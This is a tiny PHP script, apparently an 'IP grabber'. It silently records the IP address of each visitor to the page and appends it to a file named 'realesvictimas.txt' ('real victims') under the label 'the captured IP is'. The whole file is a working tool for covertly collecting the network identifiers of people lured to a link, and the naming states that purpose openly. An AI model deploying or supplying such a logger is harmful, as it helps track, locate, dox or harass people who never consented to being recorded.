 <?php

$ip = $_SERVER['REMOTE_ADDR']; 
$f = fopen("realesvictimas.txt", "a"); 
fwrite ($f, 'IP: LA IP CAPTURADA ES! '.$ip.'');
fclose($f);
?>